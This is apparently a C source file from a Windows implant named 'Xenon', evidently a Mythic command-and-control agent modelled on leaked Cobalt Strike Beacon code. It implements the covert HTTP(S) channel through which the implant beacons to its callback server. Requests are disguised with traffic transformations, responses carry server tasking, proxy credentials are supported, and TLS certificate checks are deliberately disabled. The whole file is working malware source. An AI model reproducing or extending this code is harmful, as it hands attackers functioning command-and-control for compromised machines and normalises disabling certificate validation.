/*
	HTTP(S) requests
	Ref: https://github.com/kyxiaxiang/Beacon_Source/blob/main/Beacon/network.c
*/

#include "TransportHttp.h"
#include "Xenon.h"
#include "Config.h"

#ifdef HTTPX_TRANSPORT
#include <winsock2.h>
#include <ws2ipdef.h>
#include <stdio.h>
#include "Transform.h"



#define INTERNET_OPTION_SUPPRESS_SERVER_AUTH 	104

BOOL gHttpIsInit = FALSE;
HINTERNET gInternetConnect;
DWORD gHttpOptions;
DWORD gContext;
HINTERNET gInternetOpen;
int gPostBufferLength = 0;
char* gPostBuffer = NULL;


void HttpInit(void)
{
	if (gHttpIsInit)
		return;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		WSACleanup();
		exit(1);
	}

	gHttpIsInit = TRUE;
}


// ULONG HttpGetActiveAdapterIPv4()
// {
// 	SOCKET sock = WSASocketA(AF_INET, SOCK_DGRAM, 0, NULL, 0, 0);
// 	if (sock == INVALID_SOCKET)
// 	{
// 		return 0;
// 	}

// 	DWORD bytesReturned;
// 	int numInterfaces = 0;
// 	INTERFACE_INFO interfaceInfo[20];
// 	if (!WSAIoctl(sock, SIO_GET_INTERFACE_LIST, NULL, 0, interfaceInfo, sizeof(interfaceInfo), &bytesReturned, NULL, NULL))
// 	{
// 		numInterfaces = bytesReturned / sizeof(INTERFACE_INFO);
// 	}

// 	for (int i = 0; i < numInterfaces; i++)
// 	{
// 		if (!(interfaceInfo[i].iiFlags & IFF_LOOPBACK) && interfaceInfo[i].iiFlags & IFF_UP)
// 		{
// 			closesocket(sock);
// 			return interfaceInfo[i].iiAddress.AddressIn.sin_addr.s_addr;
// 		}
// 	}

// 	closesocket(sock);
// 	return 0;
// }

// Check if the gInternetConnect handle is active
BOOL IsInternetConnectOpen(HINTERNET hInternet)
{
	BOOL Status = FALSE;

    if (!hInternet)
        goto end;

    DWORD error = GetLastError();
    if (error == ERROR_INVALID_HANDLE)
		goto end;

	DWORD buffer = 0;
    DWORD bufferSize = sizeof(buffer);
	// Try querying an option from the handle
    if (InternetQueryOption(hInternet, INTERNET_OPTION_HANDLE_TYPE, &buffer, &bufferSize))
    {
        Status = TRUE;
		goto end;
    }

end:

    return Status;
}

void HttpUpdateSettings(HINTERNET hInternet)
{
	if (xenonConfig->CallbackDomains->isSSL)
	{
		int buffer;
		int length = sizeof(buffer);
		InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, &length);
		buffer |= (SECURITY_FLAG_IGNORE_REVOCATION |
			SECURITY_FLAG_IGNORE_UNKNOWN_CA |
			SECURITY_FLAG_IGNORE_WRONG_USAGE |
			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID);
		InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer));
	}
}

BOOL HttpCheckResponse(HINTERNET hInternet)
{
	char status[256];
	DWORD statusCodeLength = sizeof(status);
	if (!HttpQueryInfoA(hInternet, HTTP_QUERY_STATUS_CODE, status, &statusCodeLength, NULL))
		return FALSE;

	// _dbg("STATUS CODE : %s", status);
	return atoi(status) == HTTP_STATUS_OK;
}

BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
{
#define MAX_URI 0x400		// 1kb
#define MAX_URL 0x400
#define MAX_READ 0x1000		// 4kb
#define MAXGET 0x300000		// 3mb
	TRANSFORM transform;
	memset(&transform, 0, sizeof(transform));

	CHAR finalUri[MAX_URI];
	memset(finalUri, 0, sizeof(finalUri));

	TransformInit(&transform, MAXGET);

	TransformApply(&transform, package->buffer, package->length, S_C2_GET_CLIENT);

	// Add any URI parameters (e.g., /test?value=1&other=2)
	if (strlen(transform.uriParams))
		snprintf(finalUri, sizeof(finalUri), "%s%s", transform.uri, transform.uriParams);
	else
		snprintf(finalUri, sizeof(finalUri), "%s", transform.uri);

	// _dbg("DEBUG REQUEST SETTINGS HERE:");
	// _dbg("[headers] 	    \n%s", transform.headers);
	// _dbg("[uri] 			%s", transform.uri);
	// _dbg("[uriParams] 		%s", transform.uriParams);
	// _dbg("[bodyLength]		%d", transform.bodyLength);
	// _dbg("[body] 			%s", (const unsigned char*)transform.body);
	// _dbg("[outputLength]	%d", transform.outputLength);
	// _dbg("[transformed]		%s", transform.transformed);

	//_dbg("Final URI : %s", finalUri);

	HINTERNET hInternet = HttpOpenRequestA(
		gInternetConnect,
		"GET",
		finalUri,
		NULL,
		NULL,
		NULL,
		gHttpOptions,
		&gContext);

	SecureZeroMemory(finalUri, sizeof(finalUri));

	DWORD error = 0;

	// Check if InternetOpenA failed
	if (hInternet == NULL)
	{
		error = GetLastError();
		_err("HttpOpenRequestA failed with error code: %d", error);
		TransformDestroy(&transform);
		return FALSE;
	}

	HttpUpdateSettings(hInternet);
	// Send request
	if (!HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength))
	{
		error = GetLastError();
		_err("HttpSendRequestA failed with error code: %d", error);
		TransformDestroy(&transform);
		return FALSE;
	}
	
	TransformDestroy(&transform);

	DWORD bytesAvailable 	= 0;
	DWORD totalBytesRead 	= 0;
	DWORD bytesRead 		= 0;
	BYTE* dataBuffer 		= NULL;
	SIZE_T recoveredLen 	= 0;
	BOOL success 			= FALSE;

	BYTE buffer[MAX_READ]; // 4kb
	
	// Check if we can read the response and get the available bytes
	if (HttpCheckResponse(hInternet) && InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0) && bytesAvailable > 0) {
		
		//_dbg("Response is %d bytes ", bytesAvailable);

		dataBuffer = LocalAlloc(LPTR, bytesAvailable);
		if (!dataBuffer) {
			_err("[HTTP] Memory allocation failed.\n");
			InternetCloseHandle(hInternet);
			return FALSE;
		}
		
		do {
			// Clear the buffer for the next read
			memset(buffer, 0, MAX_READ);

			if (!InternetReadFile(hInternet, buffer, MAX_READ, &bytesRead)) {
				DWORD err = GetLastError();
				_err("[HTTP] Error %u in InternetReadFile.\n", err);
				InternetCloseHandle(hInternet);
				LocalFree(dataBuffer);
				return FALSE;
			}

			// Log how many bytes were read in this iteration
			// //_dbg("[HTTP] Bytes read this iteration: %d", bytesRead);

			if (bytesRead == 0) break; 	// No more data

			// Check if more memory is needed
			if (totalBytesRead + bytesRead > bytesAvailable) {
				// //_dbg("[HTTP] Expanding buffer size.");
				bytesAvailable = totalBytesRead + bytesRead;
				dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable, LMEM_MOVEABLE | LMEM_ZEROINIT);
				if (!dataBuffer) {
					_err("[HTTP] Memory reallocation failed.\n");
					InternetCloseHandle(hInternet);
					LocalFree(dataBuffer);
					return FALSE;
				}
			}

			// Accumulate read data
			memcpy(dataBuffer + totalBytesRead, buffer, bytesRead);
			totalBytesRead += bytesRead;

		} while (bytesRead > 0);

		// Undo server's transformations to get mythic payload 
		if (!TransformReverse((char*)dataBuffer, totalBytesRead, &recoveredLen, S_C2_GET_SERVER, MAXGET))
		{
			_err("Failed to reverse transformations.");
			LocalFree(dataBuffer);
			InternetCloseHandle(hInternet);
			return FALSE;
		}

		// Output data buffer and size
		*ppOutData = dataBuffer;
		*pOutLen = recoveredLen;

		success = TRUE;
	}
	else {
		_err("[HTTP] No data available or response check failed.\n");
	}

	InternetCloseHandle(hInternet);

	return success;
}


BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
{
#define MAX_URI 0x400
#define MAX_URL 0x400
#define MAX_READ 0x1000
#define MAXGET 0x300000		// 3mb

	const char* acceptTypes[] = { "*/*", NULL };

	TRANSFORM transform;
	memset(&transform, 0, sizeof(transform));

	CHAR finalUri[MAX_URI];
	memset(finalUri, 0, sizeof(finalUri));

	TransformInit(&transform, MAXGET);

	TransformApply(&transform, package->buffer, package->length, S_C2_POST_CLIENT);


	if (strlen(transform.uriParams))
		snprintf(finalUri, sizeof(finalUri), "%s%s", transform.uri, transform.uriParams);
	else
		snprintf(finalUri, sizeof(finalUri), "%s", transform.uri);

	//_dbg("DEBUG REQUEST SETTINGS HERE:");
	//_dbg("[headers] 	    \n%s", transform.headers);
	//_dbg("[uri] 			%s", transform.uri);
	//_dbg("[uriParams] 		%s", transform.uriParams);
	//_dbg("[bodyLength]		%d", transform.bodyLength);
	//_dbg("[body] 			%s", (const unsigned char*)transform.body);
	//_dbg("[outputLength]	%d", transform.outputLength);
	//_dbg("[transformed]		%s", transform.transformed);

	//_dbg("Final URI : %s", finalUri);

	HINTERNET hInternet = HttpOpenRequestA(
		gInternetConnect,
		"POST",
		finalUri,
		NULL,
		NULL,
		NULL,
		gHttpOptions,
		&gContext);

	SecureZeroMemory(finalUri, sizeof(finalUri));

	DWORD error = 0;

	// Check if InternetOpenA failed
	if (hInternet == NULL)
	{
		error = GetLastError();
		_err("HttpOpenRequestA failed with error code: %d", error);
		TransformDestroy(&transform);
		return FALSE;
	}

	HttpUpdateSettings(hInternet);

	// Send request
	if (!HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength))
	{
		error = GetLastError();
		_err("HttpSendRequestA failed with error code: %d", error);
		TransformDestroy(&transform);
		return FALSE;
	}
	

	TransformDestroy(&transform);


	DWORD bytesAvailable = 0;
	DWORD totalBytesRead = 0;
	DWORD bytesRead = 0;
	BYTE* dataBuffer = NULL;
	BYTE buffer[MAX_READ]; // Assuming MAX_READ is defined (e.g., 1024)
	BOOL success = FALSE;
	
	// Check if we can read the response and get the available bytes
	if (HttpCheckResponse(hInternet) && InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0) && bytesAvailable > 0) {
		
		//_dbg("Response contains %d bytes ", bytesAvailable);

		dataBuffer = LocalAlloc(LPTR, bytesAvailable); // Allocate memory for the data
		if (!dataBuffer) {
			_err("[HTTP] Memory allocation failed.\n");
			return FALSE;
		}
		

		do {
			// Clear the buffer for the next read
			memset(buffer, 0, MAX_READ);

			if (!InternetReadFile(hInternet, buffer, MAX_READ, &bytesRead)) {
				DWORD err = GetLastError();
				_err("[HTTP] Error %u in InternetReadFile.\n", err);
				LocalFree(dataBuffer);
				return FALSE;
			}

			// Log how many bytes were read in this iteration
			// //_dbg("[HTTP] Bytes read this iteration: %d", bytesRead);

			if (bytesRead == 0) {
				break;
			}

			// Check if more memory is needed
			if (totalBytesRead + bytesRead > bytesAvailable) {
				// //_dbg("[HTTP] Expanding buffer size.");
				bytesAvailable = totalBytesRead + bytesRead; // Increase the buffer size
				dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable, LMEM_MOVEABLE | LMEM_ZEROINIT);
				if (!dataBuffer) {
					_err("[HTTP] Memory reallocation failed.\n");
					return FALSE;
				}
			}

			// Accumulate read data
			memcpy(dataBuffer + totalBytesRead, buffer, bytesRead);
			totalBytesRead += bytesRead;

		} while (bytesRead > 0);

		SIZE_T recoveredLen;

		if (!TransformReverse((char*)dataBuffer, totalBytesRead, &recoveredLen, S_C2_POST_SERVER, MAXGET))
		{
			LocalFree(dataBuffer);
			return FALSE;
		}

		// Output data addresses
		*ppOutData = dataBuffer;
		*pOutLen = recoveredLen;

		success = TRUE;
	}
	else {
		_err("[HTTP] No data available or response check failed.\n");
	}


	InternetCloseHandle(hInternet);
	return success;
}


void HttpConfigureHttp(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent)
{
    gHttpOptions = INTERNET_FLAG_RELOAD | 		// retrieve the original item, not the cache
        INTERNET_FLAG_NO_CACHE_WRITE | 			// don't add this to the IE cache
        INTERNET_FLAG_KEEP_CONNECTION | 		// use keep-alive semantics
        INTERNET_FLAG_NO_UI | 					// no cookie popup
		INTERNET_FLAG_NO_COOKIES;				// allows cookies to be added directly into headers for wininet

    if (xenonConfig->CallbackDomains->isSSL)
    {
        gHttpOptions |= INTERNET_FLAG_SECURE | // use PCT/SSL if applicable (HTTP)
            INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | // ignore date invalid cert errors
            INTERNET_FLAG_IGNORE_CERT_CN_INVALID; // ignore common name invalid cert errors
    }

    DWORD accessType;
    LPCSTR proxy = NULL;  // Initialize proxy to NULL
    BOOL shouldCreateInternetOpen = TRUE;

    if (xenonConfig->isProxyEnabled)
    {
        accessType = INTERNET_OPEN_TYPE_PROXY;
        proxy = xenonConfig->proxyUrl;
    }
    else
    {
        accessType = INTERNET_OPEN_TYPE_DIRECT;  // Use direct connection
    }

    // Create the internet session (InternetOpenA)
    if (shouldCreateInternetOpen)
    {
		//_dbg("[useragent]		%s", lpszAgent);
        gInternetOpen = InternetOpenA(
            lpszAgent,
            accessType,
            proxy,
            NULL,
            0);
        
        // Check if InternetOpenA failed
        if (gInternetOpen == NULL)
        {
            DWORD error = GetLastError();
            _err("InternetOpenA failed with error code: %d", error);
            return;  // Early return on failure
        }
    }

    // Set timeout options
    int timeout = 240000;  // 240 seconds
    if (!InternetSetOptionA(gInternetOpen, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout)))
    {
        DWORD error = GetLastError();
        _err("Failed to set send timeout. Error: %d", error);
        return;  // Early return on failure
    }

    if (!InternetSetOptionA(gInternetOpen, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout)))
    {
        DWORD error = GetLastError();
        _err("Failed to set receive timeout. Error: %d", error);
        return;  // Early return on failure
    }

    // Connect to the server (InternetConnectA)
    gInternetConnect = InternetConnectA(
        gInternetOpen,
        lpszServerName,
        nServerPort,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0);

    // Check if InternetConnectA failed
    if (gInternetConnect == NULL)
    {
        DWORD error = GetLastError();
        _err("InternetConnectA failed with error code: %d", error);
        return;  // Early return on failure
    }

    // Handle manual proxy credentials if applicable
    if (xenonConfig->isProxyEnabled) 
    {
        if (!InternetSetOptionA(gInternetOpen, INTERNET_OPTION_PROXY_USERNAME, (LPVOID)xenonConfig->proxyUsername, strlen(xenonConfig->proxyUsername))) 
        {
            DWORD error = GetLastError();
            _err("Failed to set proxy username. Error: %d", error);
            return;  // Early return on failure
        }

        if (!InternetSetOptionA(gInternetOpen, INTERNET_OPTION_PROXY_PASSWORD, (LPVOID)xenonConfig->proxyPassword, strlen(xenonConfig->proxyPassword))) 
        {
            DWORD error = GetLastError();
            _err("Failed to set proxy password. Error: %d", error);
            return;  // Early return on failure
        }
    }
}


void HttpClose(void)
{
	InternetCloseHandle(gInternetConnect);
	InternetCloseHandle(gInternetOpen);
}


#endif // HTTPX_TRANSPORT